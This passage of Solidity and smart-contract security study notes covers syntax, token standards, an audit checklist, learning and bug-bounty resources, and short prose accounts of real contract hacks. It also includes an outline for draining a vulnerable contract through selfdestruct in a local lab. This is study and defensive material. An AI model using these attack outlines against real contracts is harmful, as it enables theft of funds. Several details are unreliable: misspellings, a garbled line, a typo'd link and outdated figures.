       if (msg.value &gt;= price) {
          _;
       }
    }
 }</code></pre><p></p><p>The function body is inserted where the special symbol "_;" appears in the definition of a modifier. So if condition of modifier is satisfied while calling this function, the function is executed and otherwise, an exception is thrown.</p>
 <a href="https://www.tutorialspoint.com/solidity/solidity_function_modifiers.htm" target="_blank" rel="noopener noreferrer">link</a>


<h2>Smart Contract Standards</h2>
<p><a target="_blank" rel="nofollow" href="https://eips.ethereum.org/erc"><strong>ERCs</strong></a> - The Ethereum Request for Comment repository</p><ul><li><p>Tokens</p><ul><li><p><a target="_blank" rel="nofollow" href="https://eips.ethereum.org/EIPS/eip-20"><strong>ERC-20</strong></a> - Original token contract for fungible assets</p></li><li><p><a target="_blank" rel="nofollow" href="https://eips.ethereum.org/EIPS/eip-721"><strong>ERC-721</strong></a> - Token standard for non-fungible assets</p></li><li><p><a target="_blank" rel="nofollow" href="https://eips.ethereum.org/EIPS/eip-777"><strong>ERC-777</strong></a> - An improved token standard for fungible assets</p></li><li><p><a target="_blank" rel="nofollow" href="https://eips.ethereum.org/EIPS/eip-918"><strong>ERC-918</strong></a> - Mineable Token Standard</p></li></ul></li><li><p><a target="_blank" rel="nofollow" href="https://eips.ethereum.org/EIPS/eip-165"><strong>ERC-165</strong></a> - Creates a standard method to publish and detect what interfaces a smart contract implements.</p></li><li><p><a target="_blank" rel="nofollow" href="https://eips.ethereum.org/EIPS/eip-725"><strong>ERC-725</strong></a><strong> </strong>- Proxy contract for key management and execution, to establish a Blockchain identity.</p></li><li><p><a target="_blank" rel="nofollow" href="https://eips.ethereum.org/EIPS/eip-173"><strong>ERC-173</strong></a><strong> </strong>- A standard interface for ownership of contracts</p><p></p></li></ul>

<h2>Great readings about Ethereum?</h2>
<p>Required:</p><p></p><ul><li><p>ÔªøÔªø'<strong>Smart Contracts: 12 Use Cases for Business &amp; Beyond'</strong> Chamber of Digital Commerce</p></li><li><p>ÔªøÔªø'<strong>State of the Dapps: 5 Observations from Usage Data</strong>' McCann</p></li><li><p>ÔªøÔªø'<strong>Ethereum Competitors: Guide to the Alternative Smart Contract Platforms</strong>' Blockonomi</p></li></ul><p></p><p>Optional:</p><p></p><ul><li><p>ÔªøÔªø'<strong>Smart Contracts: Building Blocks for Digital Markets</strong>' Szabo</p></li><li><p>ÔªøÔªø'<strong>A Next-Generation Smart Contract and Decentralized Application Platform</strong>'<br>Ethereum</p></li><li><p>ÔªøÔªø'<strong>Blockchain Technology as a Regulatory Technology</strong>' De Filippi &amp; Hassan</p></li></ul>

<h2>What does it mean Turing Complete?</h2>
<p>In simpler terms, a system or language that is Turing complete is <strong>capable of performing any computation</strong> that can be algorithmically described. This means that it can <strong>solve any problem</strong> that is computationally solvable. Turing completeness is a fundamental property of many programming languages and computational systems.</p><p></p><p>Turing completeness also means that the system is subject to the limitations of Turing machines, including the <strong>famous halting problem</strong>. The halting problem states that it's impossible to determine, in general, whether a given program will halt or run indefinitely.</p>

<h2>Bitcoin vs Ethereum Design</h2>
<p>‚Ä¢ <em>Founder</em>: <strong>Satoshi Nakamoto</strong> ‚Üí <strong>Vatalik Buterin</strong></p><p>‚Ä¢ <em>Genesis</em>: <strong>January 2009</strong> ‚Üí <strong>July 2015</strong></p><p>‚Ä¢ <em>Code</em>: <strong>Non Turing</strong> (Script) ‚Üí <strong>Turing Complete</strong> (Solidity, Serpent, LLL or Mutan)</p><p>‚Ä¢ <em>Ledger</em>: <strong>UTXO - Transaction</strong> ‚Üí <strong>State - Account Based</strong></p><p>‚Ä¢ <em>Merkle Trees</em>: <strong>Transactions</strong> ‚Üí <strong>Transactions, State, Storage, Receipts</strong> (w/nonces)</p><p>‚Ä¢ <em>Block Time</em>: <strong>10 minutes</strong> ‚Üí <strong>14 seconds</strong></p><p>‚Ä¢ <em>Consensus</em>: <strong>Proof of Work</strong> ‚Üí <strong>Proof of Stake(was work before)</strong></p><p>‚Ä¢ <em>Hash Function</em>: <strong>SHA 256</strong> ‚Üí <strong>Ethash</strong></p>

<h2>Smart Contract Platforms</h2>
<ul><li><p><strong>Ethereum</strong> (2015) - $22 b current market value</p></li><li><p>ÔªøÔªø<strong>EOS</strong> (2018) - $5 b - completed $4.2 b year long ICO in July</p></li><li><p>ÔªøÔªø<strong>NEO</strong> (2016) - $1.1 b - China; delegated BFT; supports wider range of code</p></li><li><p><strong>ÔªøÔªøEthereum Classic</strong> (2016) - $1.1 b - Created from the 'DAO' hard fork</p></li><li><p>ÔªøÔªø<strong>LISK</strong> (2016) - $360 m - code in Java; uses side chains</p></li><li><p>ÔªøÔªø<strong>Stratis</strong> (2017) - $150 m</p></li></ul>

<h2>Smart Contract Potential Use Cases</h2>
<ul><li><p><strong>Digital Identity</strong></p></li><li><p><strong>Records</strong></p></li><li><p><strong>Securities</strong></p></li><li><p><strong>Trade Finance</strong></p></li><li><p><strong>Derivatives</strong></p></li><li><p><strong>Financial Data</strong></p></li><li><p><strong>Mortgages</strong></p></li><li><p><strong>Land Title</strong></p></li><li><p><strong>Supply Chain</strong></p></li><li><p><strong>Auto Insurance</strong></p></li><li><p><strong>Clinical Trials</strong></p></li><li><p><strong>Cancer Research</strong></p></li></ul>

<h2>MIT 15.S12 Blockchain and Money, Fall 2018 course featuring Gary Gensler</h2>
<a href="https://www.youtube.com/playlist?list=PLUl4u3cNGP63UUkfL0onkxF6MYgVa04Fn" target="_blank" rel="noopener noreferrer">link</a>

<h2>What are the Smart Contract Auditor Salaries?</h2>
<p>JUNIOR </p><p>120K-150K</p><p></p><p>MID/SENIOR </p><p>200K-300K</p><p></p><p>TOP AUDITORS</p><p>500K-1M+</p>
<a href="https://www.youtube.com/watch?v=AtTb_BpFZkM" target="_blank" rel="noopener noreferrer">link</a>

<h2>How Much Solidity Developers Make(salary)?</h2>
<p>Junior</p><p>75k - 100k</p><p></p><p>Senior</p><p>200k - 500k</p>
<a href="https://www.youtube.com/watch?v=mdU2hrTEJC8" target="_blank" rel="noopener noreferrer">link</a>

<h2>Audit Checklist?</h2>
<h1>CryptoFin's Solidity Auditing Checklist</h1><p>In the last year, hundreds of millions of dollars worth of crypto have been lost by faulty smart contracts.</p><p>Beyond devastating those who lose funds, these blunders harm the ecosystem as a whole by signaling the immaturity of smart contracts and reinforcing people‚Äôs wariness. Better due diligence processes could‚Äôve prevented many of the issues found, saving a ton of headaches, money, and stifled progress.</p><p>At CryptoFin, we‚Äôve audited many production-ready Solidity contracts. We‚Äôve compiled a list of common findings, and issues to watch out for when auditing a contract for a mainnet launch.</p><p>We hope this checklist is useful to the community and will raise the bar for contract quality!</p><h2>Checklist<br>Core Checks</h2><p>These are basic checks to undertake with any contract. Our checklist reflects Solidity v0.4.24.</p><ul><li><p>Prevent overflow and underflow</p><ul><li><p>Use <a target="_blank" rel="noopener noreferrer nofollow" href="https://github.com/OpenZeppelin/openzeppelin-solidity/blob/master/contracts/math/SafeMath.sol">SafeMath</a></p></li></ul></li><li><p>Function Visibility</p><ul><li><p>Ensure that all relevant functions are marked with the correct visibility</p></li></ul></li><li><p>Fix compiler warnings</p></li><li><p>Avoid using problematic features - If you must, be aware of their many nuances</p><ul><li><p>send (<a target="_blank" rel="nofollow" href="https://ethereum.stackexchange.com/a/38642/3118">nuances</a>)</p></li><li><p>Low level functions (<code>call</code>, <code>delegatecall</code>, <code>callcode</code>, inline assembly)</p></li><li><p>var</p></li></ul></li><li><p>External Calls - Every external contract call is a risk</p><ul><li><p>Check for <a target="_blank" rel="nofollow" href="https://dasp.co/#item-1">reentrancy</a> - and ensure state committed before external call</p><ul><li><p>Check for "short circuits" (external contract calls that can fail or be manipulated to fail, causing a denial of service of a function)</p><ul><li><p>This is often overlooked for ERC20, which can <a target="_blank" rel="nofollow" href="https://blog.cryptofin.io/what-we-learned-from-auditing-the-top-20-erc20-token-contracts-7526ef3b6fb1">fail unexpectedly due to freezing</a></p></li><li><p><a target="_blank" rel="nofollow" href="https://solidity.readthedocs.io/en/v0.4.24/security-considerations.html?highlight=callstack#callstack-depth">Callstack depth</a> can cause this as well</p></li></ul></li></ul></li></ul></li><li><p>Dependencies</p><ul><li><p>Use audited and trustworthy dependencies</p></li><li><p>Ensure newly written code is minimized by using libraries</p></li></ul></li><li><p>Time Manipulation - Timestamps can theoretically be manipulated by malicious miners by up to a few minutes</p><ul><li><p>Ensure important mechanisms aren't overly sensitive to timestamps</p></li></ul></li><li><p>Rounding Errors</p><ul><li><p>Check that truncation doesn't produce unexpected behavior (eg. incorrect results, locked funds)</p></li></ul></li><li><p>Randomness</p><ul><li><p>Don't rely on pseudo-randomness for important mechanisms (eg. keccak with a deterministic seed like blockhash, blocknumber, etc.)</p></li></ul></li><li><p>Validate inputs of external/public functions</p><ul><li><p>Ensure requires to bound and check presence of arguments</p></li></ul></li><li><p>Prevent unbounded loops</p></li><li><p>Appropriate use of push payments</p></li><li><p>Change old Solidity constructs</p><ul><li><p>selfdestruct vs suicide</p></li><li><p>keccak256 vs sha3</p></li></ul></li><li><p>Don't use tx.origin as an authentication mechanism</p></li><li><p>Verify changes in the most recent Solidity version (if upgrading from an older version)</p></li></ul><p></p><h3>Testing and Software Engineering</h3><ul><li><p>Test Coverage</p><ul><li><p>Have 100% branch test coverage</p></li></ul></li><li><p>Unit Tests</p><ul><li><p>Cover all critical edge cases with unit tests</p></li></ul></li><li><p>Integration Tests</p><ul><li><p>Have extensive integration tests</p></li></ul></li><li><p>Code Freeze</p><ul><li><p>Don't deploy recently written code, especially when written under a tight deadline</p></li></ul></li></ul><p></p><h3>Resilience</h3><p>We always check for code that will mitigate risk when (not if) a contract fails. When a contract doesn‚Äôt have this, it‚Äôs often a warning sign.</p><ul><li><p>What failure states would be most disastrous?</p></li><li><p>Are there assert checks for critical values? (e.g., individual balances total to sum)</p></li><li><p>Speed Bumps</p></li><li><p>Does the contract have a speed bump? (e.g., delay in withdrawing funds, like the DAO)</p></li><li><p>Circuit Breakers</p><ul><li><p>Does the contract have a circuit breaker? (preventing critical functions in an emergency mode)</p></li></ul></li></ul><p></p><h3>Auditing</h3><p>Auditing helps catch many bugs, but shouldn‚Äôt also be seen as a magic bullet. Your system still needs to handle failure gracefully.</p><ul><li><p>Audits</p><ul><li><p>Have code audited by (preferably) multiple external parties (in series)</p></li></ul></li><li><p>Time Management</p><ul><li><p>Allocate comfortable time after the audit to address issues</p></li></ul></li></ul><p></p><h3>High Risk Areas</h3><p>When performing an audit, CryptoFin pays special attention to the these areas which require greater scrutiny, as they often add bugs.</p><ul><li><p>external and public functions</p></li><li><p>Assembly code and other low level calls</p></li><li><p>Superuser privileges</p></li><li><p>Any areas that are affected by timing and/or network congestion</p></li><li><p>Areas dealing with value transfer and payable functions</p></li><li><p>Push payments (rather than pull)</p></li><li><p>Code written most recently</p></li></ul><p></p><h3>Security Resources</h3><ul><li><p><a target="_blank" rel="noopener noreferrer nofollow" href="https://github.com/ethereum/wiki/wiki/Safety">Ethereum Security Guide</a></p></li><li><p><a target="_blank" rel="nofollow" href="https://consensys.github.io/smart-contract-best-practices/">Consensys Ethereum Smart Contract Security Best Practices</a></p></li><li><p><a target="_blank" rel="nofollow" href="https://dasp.co/">Decentralized Application Security Project</a></p></li></ul><p></p><h3>Where to go from here</h3><p>Many of these checklist items are well-suited for a linter. We welcome any contributors who want to take a crack at it.<br></p>
<a href="https://github.com/cryptofinlabs/audit-checklist" target="_blank" rel="noopener noreferrer">link</a>

<h2>What's the syntax of mappings in Solidity?</h2>
<pre><code>mapping(key =&gt; value) &lt;access specifier&gt; &lt;name&gt;;</code></pre>
<a href="https://www.geeksforgeeks.org/solidity-mappings/" target="_blank" rel="noopener noreferrer">link</a>

<h2>What's the syntax of events in Solidity?</h2>
<pre><code>//Declare an Event
event Deposit(address indexed _from, bytes32 indexed _id, uint _value)
//Emit an event
emit Deposit(msg.sender, _id, msg.value);
</code></pre>
<a href="https://www.tutorialspoint.com/solidity/solidity_events.htm" target="_blank" rel="noopener noreferrer">link</a>

<h2>What's the syntax for structs in Solidity?</h2>
<p>Cannnot use the <code>new</code> keyword for creating structs.</p><p>If you're creating the struct inside a function, you also need to define its data location (<code>memory</code> in the example below), as <code>struct</code> is a <a target="_blank" rel="nofollow noreferrer" href="https://docs.soliditylang.org/en/v0.8.13/types.html#reference-types">reference type</a>.</p><p></p>
<pre><code>pragma solidity ^0.8;
contract MyContract {
    struct Foo {
        string foo1;
    }
    // implicit storage location of the property
    Foo foo1 = Foo("foo");
    function myFunction() public {
        // need to explicitly state location of the variable
        Foo memory foo2 = Foo("foo"); 
    }
}</code></pre>
<a href="https://stackoverflow.com/questions/71711648/will-i-get-an-error-if-i-use-new-keyword-which-creating-objects-of-structs" target="_blank" rel="noopener noreferrer">link</a>

<h2>Blockchain Elements That Need Securing</h2>
<h3>Layer 1</h3><ul><li><p>The underlying blockchain protocol itself (Bitcoin Core, Geth)</p></li></ul><p></p><h3>Layer 2</h3><ul><li><p>An overlaying network on top of layer 1 typically focused on scalability (Bitcoinused to perform mining Lightning network)</p></li></ul><p></p><h3>Smart Contracts</h3><ul><li><p>Automatically executing programs deployed to the blockchain (tokens, dApps, NFTs, etc.)</p></li></ul><p></p><h3>Software Wallets</h3><ul><li><p>Custodial vs. non-custodial</p></li></ul><p></p><h3>Hardware Wallets</h3><ul><li><p>Physical devices for storing private keys that are then used to send and receive funds</p></li></ul><p></p><h3>Mining Software</h3><ul><li><p>Programs used to run specialized hardware</p></li></ul><h3></h3><h3>Centralized Exchanges</h3><p>Typically require KYC (Coinbase, Binance, etc.)</p><p></p><h3>Decentralized Exchanges</h3><ul><li><p>"DeFi" exchanges typically built via Smart Contract w/ web3 front-end</p></li></ul><p></p><h3>People</h3><ul><li><p>Social engineering, rug pulls, asset protection</p></li></ul>
<a href="https://www.youtube.com/watch?v=WchXkMlKj9w" target="_blank" rel="noopener noreferrer">link</a>

<h2>What are Smart Contracts?</h2>
<ul><li><p><strong>ÔªøÔªøImmutable computer programs</strong></p></li><li><p><strong>ÔªøÔªøDecentralized execution</strong></p></li><li><p><strong>ÔªøÔªøRun on virtual machines via node software</strong></p></li><li><p><strong>ÔªøÔªøTypically written in high-level languages</strong></p></li><li><p><strong>ÔªøÔªøGet compiled into bytecode prior to deployment to the blockchain</strong></p></li><li><p><strong>ÔªøÔªøOnly run if they are called by a transaction</strong></p></li></ul><p></p><p>"Smart contract code is unforgiving. <strong>Every bug can lead to monetary loss</strong>. You should not treat smart contract programming the same way as general-purpose programming.</p><p>Writing DApps in Solidity is not like creating a web widget in JavaScript. Rather, you should<strong> apply rigorous engineering and software development methodologies</strong>, as you would in aerospace engineering or any similarly<strong> untorgiving discipline</strong>.</p><p><strong>Once you "launch" </strong>your code, there's little you can do to fix any problems."</p><p>- Andreas M. Antonopoulos &amp; Dr. Gavin Wood</p>
<a href="https://www.youtube.com/watch?v=WchXkMlKj9w" target="_blank" rel="noopener noreferrer">link</a>

<h2>What are different Crypto Blockchains?</h2>
<p>Ethereum + Solidity</p><p>Bitcoin + Stacks, RSK</p><p>Solana + Rust C, C+ + Cardano + Plutus Avalanche + Solidity</p><p>Terra + Rust</p><p>Chia + Chialisp</p><p>Hyperledger Fabric + Go, JavaScript</p><p>Nem + Java</p>

<h2>Start Blockchain Hax</h2>
<p>This guide is meant to serve as a quick start guide for hacking blockchain-based technology such as smart contracts. Follow the steps below to get set up with some of the main tools for interacting with Ethereum, smart contracts, and various tools to assist in vulnerability discovery.</p><p></p><ol><li><p><a target="_blank" rel="noopener noreferrer" href="https://start.blockchainhax.com/1-Linux-VM-ae15fc78f28a4a6e85cc58ae101be992?pvs=25"><strong>Linux VM</strong></a></p></li><li><p><a target="_blank" rel="noopener noreferrer" href="https://start.blockchainhax.com/2-Ganache-2848f9b039654626a5e808c849242b65?pvs=25"><strong>Ganache</strong></a></p></li><li><p><a target="_blank" rel="noopener noreferrer" href="https://start.blockchainhax.com/3-Metamask-96e18a292c0146f18dbacab804676bdd?pvs=25"><strong>Metamask</strong></a></p></li><li><p><a target="_blank" rel="noopener noreferrer" href="https://start.blockchainhax.com/4-Remix-IDE-b4f8f8e58ac045d785a487d0b4660027?pvs=25"><strong>Remix IDE</strong></a></p></li><li><p><a target="_blank" rel="noopener noreferrer" href="https://start.blockchainhax.com/5-Truffle-4214234aa0aa41e994b0dc5f29a15c7c?pvs=25"><strong>Truffle </strong></a><a target="_blank" rel="noopener noreferrer" href="https://start.blockchainhax.com/6-Deploy-a-Smart-Contract-49dbd373c942427e8e2383be4a5ce0dd?pvs=25">üìë</a></p></li><li><p><a target="_blank" rel="noopener noreferrer" href="https://start.blockchainhax.com/6-Deploy-a-Smart-Contract-49dbd373c942427e8e2383be4a5ce0dd?pvs=25"><strong>Deploy a Smart Contract </strong></a><a target="_blank" rel="noopener noreferrer" href="https://start.blockchainhax.com/7-Vulnerability-Scan-a-Smart-Contract-484217b1cc094653b54f4bcfb18df19e?pvs=25">üòà</a></p></li><li><p><a target="_blank" rel="noopener noreferrer" href="https://start.blockchainhax.com/7-Vulnerability-Scan-a-Smart-Contract-484217b1cc094653b54f4bcfb18df19e?pvs=25"><strong>Vulnerability Scan a Smart Contract</strong></a></p></li></ol>
<a href="https://start.blockchainhax.com/" target="_blank" rel="noopener noreferrer">link</a>

<h2>Bug Bounties</h2>
<ul><li><p><strong>Immunefi</strong></p><ul><li><p>ÔªøÔªø<a target="_blank" rel="noopener noreferrer nofollow" href="https://immunefi.com/">https://immunefi.com/</a></p></li></ul></li><li><p><strong>Consensys Bug Bounty List</strong></p><ul><li><p><a target="_blank" rel="noopener noreferrer nofollow" href="https://consensys.githuk.io/smart-contract-best-
    practices/bug_bounty_list/">ÔªøÔªøhttps://consensys.githuk.io/smart-contract-best-<br>practices/bug_bounty_list/</a></p></li></ul></li><li><p>ÔªøÔªø<strong>Code 423n4</strong></p><ul><li><p>ÔªøÔªø<a target="_blank" rel="noopener noreferrer nofollow" href="https://code423n4.com/">https://code423n4.com/</a></p></li></ul></li><li><p><strong>ÔªøÔªøHacken</strong></p><ul><li><p><a target="_blank" rel="noopener noreferrer nofollow" href="https://hackenproof.com/programs">https://hackenproof.com/programs</a></p></li></ul></li><li><p><strong>ÔªøÔªøChainlink</strong></p><ul><li><p><a target="_blank" rel="noopener noreferrer nofollow" href="https://hackerone.com/chainlink?type=team">https://hackerone.com/chainlink?type=team</a></p></li></ul></li><li><p><strong>ÔªøÔªøThe Graph</strong></p><ul><li><p>ÔªøÔªø<a target="_blank" rel="noopener noreferrer nofollow" href="https://thegraph.com/security/">https://thegraph.com/security/</a></p></li></ul></li></ul>

<h2>Resources to Get Started With Solidity</h2>
<h3>Books</h3><ul><li><p><strong>ÔªøÔªøMastering Ethereum</strong> - <a target="_blank" rel="noopener noreferrer nofollow" href="https://github.com/ethereumbook/ethereumbook">https://github.com/ethereumbook/ethereumbook</a></p></li><li><p><strong>ÔªøÔªøHands-On Smart Contract Development</strong></p></li></ul><p></p><h3>Learn Solidity</h3><p>‚Ä¢ <a target="_blank" rel="noopener noreferrer nofollow" href="https://cryptozombies.io/">https://cryptozombies.io/</a> - Free dApp building game</p><p>‚Ä¢ <a target="_blank" rel="noopener noreferrer nofollow" href="https://solidity-by-example.org">https://solidity-by-example.org</a></p><p></p><h3>ÔªøÔªøCTF</h3><ul><li><p>ÔªøÔªø<strong>Ethernaut</strong> - ÔªøÔªø<a target="_blank" rel="noopener noreferrer nofollow" href="https://ethernaut.openzeppelin.com/">https://ethernaut.openzeppelin.com/</a></p></li><li><p>ÔªøÔªø<strong>Damn Vulnerable DeFi</strong> - <a target="_blank" rel="noopener noreferrer nofollow" href="https://www.damnvulnerabledefi.xyz/">https://www.damnvulnerabledefi.xyz/</a></p></li></ul>

<h2>Smart Contract Problems</h2>
<ul><li><p>ÔªøÔªøTypically result in <strong>a significant loss of funds</strong></p></li><li><p>ÔªøÔªøSince contract code is <strong>public</strong>, <strong>anyone can analyze</strong> it for issues</p></li><li><p>ÔªøÔªø<strong>Exploits</strong> can be <strong>tested against private</strong>, local blockchain instances or on a testnet</p></li><li><p><strong>ÔªøÔªøNo patching</strong> since contracts are immutable</p></li><li><p>ÔªøÔªø<strong>Stolen funds</strong> can be <strong>very difficult to track</strong></p></li></ul>

<h2>Smart Contract Attacks</h2>
<p>Just to name a few:</p><ul><li><p><strong>Reentrancy</strong></p></li><li><p><strong>Front Running</strong></p></li><li><p><strong>Integer Overflow and Uderflow</strong></p></li><li><p><strong>Denial of Service</strong></p></li><li><p><strong>Access Control</strong></p></li><li><p><strong>Timestamp Dependance</strong></p></li></ul>

<h2>What are some Case Studies of Hacked Crypto Projects?</h2>
<p><strong>Uranium Finance</strong> - changing values in standardised contract, but forgetting to change them in one instance. Missplaced zero.</p><p></p><p><strong>Poly Network</strong> - calling a function from a contract to another contract that can change the "keepers" or owners that verify transactions. And then just sent the funds to your wallet address.</p><p></p><p><strong>Cream Finance Hack</strong> - reentrance <br><br>What I also see quite often is that they abuse the call function. By doing that you can call some other contract function(in the name of the contract you're calling it from, so not from your own) even some contract that they imported. Crazy stuff.</p><p></p><p><strong>Multi signature Wallet(The Parity Wallet Bug)</strong> - in 2017 they had a library that was not initialized, but anyone could set the owner and then destroy it. Thus anyone using this library lost their money. All multi signature wallets people had used this library and they all together lost $280m.</p><p></p><p><strong>Crypto Punks</strong> - they had the initialize function public, so anyone could change the forge address to their address and then use the withdraw function to send them all the funds from the contract.</p>

<h2>Live Exploitation Demo</h2>
<ul><li><p>ÔªøÔªøSet up and Deploy a Local Private Ethereum<br>Blockchain with Ganache.</p></li><li><p>ÔªøÔªøCompile and Deploy a Smart Contract with the self destruct vulnerabilities via Truffle.</p></li><li><p>ÔªøÔªøFund the deployed contract with Ether.</p></li><li><p>ÔªøÔªøUse customized web3js command to call the self destruct routine, and provide an attacking address of where to steal the funds before the contract is terminated.</p></li></ul>

<h2>Great videos about Real Life Hacked Smart Contract Cases</h2>
<p>BHIS | Getting Started in Blockchain Security and Smart Contract Auditing | Beau Bullock</p><p><a target="_blank" rel="noopener noreferrer nofollow" href="https://www.youtube.com/watch?v=WchXkMlKj9w&amp;t=5777s">https://www.youtube.com/watch?v=WchXkMlKj9w</a></p><p>Thats the Uranium, Poly hack and CreamFinance hack.</p><p></p><p>SEC554: Blockchain And Smart Contract Security - How To Lose $280 Million With A Single Line Of Code</p><p><a target="_blank" rel="noopener noreferrer nofollow" href="https://www.youtube.com/watch?v=bTPouSkrhIM&amp;t=886s">https://www.youtube.com/watch?v=bTPouSkrhIM</a></p><p>That's the Multisig wallet library.</p><p></p><p>Punk Protocol - reproduce Blockchain Hacks (<a target="_blank" rel="noopener noreferrer nofollow" href="http://rekt.news">rekt.news</a>)<br><a target="_blank" rel="noopener noreferrer nofollow" href="https://www.youtube.com/watch?v=UmOMKmMkjAI">https://www.youtube.com/watch?v=UmOMKmMkjAI</a></p><p>That's the initialize function left public so anyone could call it and become the owner/forge.<br><br></p>

<h2>WHERE the code of a smart contract is executed?</h2>
<p>The Ethereum network is a <strong>network of computers</strong> that run the <strong>Ethereum software</strong>, but there are two ways to participate: </p><p></p><ul><li><p><strong>Reading data</strong> from the blockchain and writing data to the blockchain. When reading data, there is only one computer involved, and the Ethereum software provides an <strong>API that anyone can query</strong>. </p></li><li><p>However, when <strong>Writing data</strong>, it becomes more complicated. The user must <strong>send a transaction</strong> to the Ethereum network describing <strong>which smart contracts</strong> they want to modify, <strong>which function</strong> they want to execute, and <strong>which arguments </strong>they want to send. </p><ul><li><p>The transaction is relayed to other computers on the network, some of which are miners. </p></li><li><p>Miners will then execute the function of a specific smart contract and modify the state of the blockchain.</p></li><li><p> Once enough transactions have been processed, the miner will solve a mathematical equation to add the block to the blockchain.</p></li></ul></li></ul>
<a href="https://www.youtube.com/watch?v=eEryVk7h748" target="_blank" rel="noopener noreferrer">link</a>

<h2>Hack Solidity</h2>
<p>Awesome playlist of videos describing and showing common smart contract attacks</p>
<a href="https://www.youtube.com/watch?v=4Mm3BCyHtDY&list=PLO5VPQH6OWdWsCgXJT9UuzgbC8SPvTRi5" target="_blank" rel="noopener noreferrer">link</a>

<h2>The 4 Step Auditor's Roadmap</h2>
<p>First step is to <strong>start building something as a developer</strong> to learn the ins and outs of Solidity, the language used for smart contracts.</p><ul><li><p>build a simple <strong>faucet contract</strong></p></li><li><p>implement <strong>meta transactions</strong></p></li><li><p>build <strong>whatever you're interested in making</strong></p></li><li><p>some options to build things are:</p><ul><li><p><strong>optimizer</strong> <strong>vault</strong></p></li><li><p><strong>nft exchange</strong></p></li><li><p><strong>defi ponzi scheme</strong></p></li></ul></li></ul><p></p><p>Through out this building phase you will become much more familiar with the Solidity code base and will learn about all the common design patterns and all the common vulnerabilties of the language to guard against.</p><p></p><p>Once comfortable with the language, the next step is to <strong>become familiar with various DeFi primitives and protocols</strong>.</p><ul><li><p>Dexs</p><ul><li><p><strong>Uniswap</strong></p></li><li><p><strong>Balancer</strong></p></li><li><p><strong>Curve</strong></p></li></ul></li><li><p>Auto-compounder vaults</p><ul><li><p><strong>Yearn</strong></p></li><li><p><strong>Beefy</strong></p></li></ul></li><li><p>Lending Protocols</p><ul><li><p><strong>Compound</strong></p></li><li><p><strong>Ave</strong></p></li></ul></li><li><p>Staking</p></li></ul><p></p><p>Actually invest in the protocols and use the protocols that you're learning about. This will make you more motivated to understand how they work under the hood.</p><p></p><p>After that, <strong>dive deep into web3 security</strong> to specialize in vulnerabilities and bugs that can arise while writing smart contracts.</p><ul><li><p>At this point learn as many Vulnerabilities, Attacks, Exploits and Common Bugs as you possibly can. Index these things into your brain!</p></li><li><p>Use these tools:</p><ul><li><p>Encyclopedia of solidity attacks <a target="_blank" rel="noopener noreferrer nofollow" href="https://lab.guardianaudits.com/encyclopedia-of-solidity-attack-vectors">https://lab.guardianaudits.com/encyclopedia-of-solidity-attack-vectors</a></p></li><li><p>Security races <a target="_blank" rel="noopener noreferrer nofollow" href="https://www.ghostsofepochspast.xyz/">https://www.ghostsofepochspast.xyz/</a></p></li></ul></li></ul><p></p><p>The Web3 Security Research Phase never really ends you can always learn more.</p><p></p><p>Finally, <strong>build a personal brand</strong> within the web3 security community to establish oneself as a skilled auditor.</p><ul><li><p>Compete in Audit Contests</p></li><li><p>Do Private Audits</p></li><li><p>Build up your Porfolio to stand out from the crowd</p></li><li><p>Share all your learnings with the Community</p></li></ul>
<a href="https://www.youtube.com/watch?v=vlRauaoboFI" target="_blank" rel="noopener noreferrer">link</a>

<h2>Vitalik Buterin blog</h2>
<a href="https://vitalik.eth.limo/index.html" target="_blank" rel="noopener noreferrer">link</a>

<h2>Clean Contracts - a guide on smart contract patterns & practices</h2>
<a href="https://www.useweb3.xyz/guides/clean-contracts" target="_blank" rel="noopener noreferrer">link</a>

<h2>How Scam Tokens Are Built | Detect Hidden Functions On a Smart Contract</h2>
<ul><li><p><strong>Hidden mint function</strong> in one contract can be used by the owner to mint tokens even after renouncing ownership.</p></li><li><p>The second contract can become a <strong>honeypot</strong> as the <strong>owner</strong> can <strong>increase</strong> the <strong>maximum liquidity fee</strong> to a point where <strong>no one can sell</strong> their tokens.</p></li><li><p>The contract also has a <strong>blacklisting function</strong> that can be renamed to deceive investors.</p></li></ul><p></p><p>Investors should <strong>thoroughly check the source code</strong> of any token they invest in and be wary of red flags.</p>
<a href="https://www.youtube.com/watch?v=O6Ltm6SugJY" target="_blank" rel="noopener noreferrer">link</a>

<h2>Are private variables truly private?</h2>
<p><strong>No</strong>, you can still <strong>read</strong> it from the <strong>outside</strong>. You can easily <strong>decode</strong> the data if you have access to the deployment transaction in <strong>input data</strong>.</p>

<h2>What's Smart Contract ABI?</h2>
<p><strong>ABI</strong> specifies a smart <strong>contracts interface</strong> or set of functions that may be <strong>accessible</strong> from <strong>outside</strong> of the smart contract. </p><p></p><p>Only the <strong>function signatures</strong> are defined <strong>not</strong> their <strong>implementation</strong>. </p><p></p><p>The contract's <strong>events</strong> are likewise <strong>defined</strong> in the <strong>ABI</strong>. </p><p></p><p>The ABI is <strong>used</strong> by Ethereum <strong>client libraries</strong> like <strong>web3</strong> to interface with the smart contract outside of the smart contract.</p><p></p><p>A smart contract's ABI, or <strong>Application Binary Interface</strong>, is a <strong>JSON</strong> representation of the <strong>contract's methods and events</strong>. It serves as an interface between the Ethereum blockchain and client-side applications (like web3.js or Ethers.js) by providing useful information about the smart contract.</p><p>The ABI includes:</p><ul><li><p><strong>Function names</strong></p></li><li><p><strong>Function input and output types</strong></p></li><li><p><strong>Function modifiers (like payable, view, or pure)</strong></p></li><li><p><strong>Event names</strong></p></li><li><p><strong>Event input types and indices</strong></p></li></ul><p></p><p>With the help of the ABI, a client-side application can construct correct data types, encoding, and decoding of function calls and events when interacting with a smart contract on the Ethereum blockchain.</p>

<h2>Can you use console.log in Solidity?</h2>
<p>No there is no way to log into a console. But you can <strong>define events </strong>and they will show in the transactions.</p><p></p><p>Or you can use <strong>hardhat library</strong>.</p>

<h2>How to protect yourself from re-entrancy attack?</h2>
<ol><li><p><strong>Lower balances</strong> and update other state variables <strong>before invoking</strong> the other contract.</p></li><li><p>implement <strong>re-entrancy guard</strong> that uses a variable to determine when a call is second in the stack.</p></li><li><p><strong>Limit</strong> the amount of <strong>gas</strong> available to the called contract.</p></li></ol>

<h2>Write the 2 APIs used to interact with a smart contract?</h2>
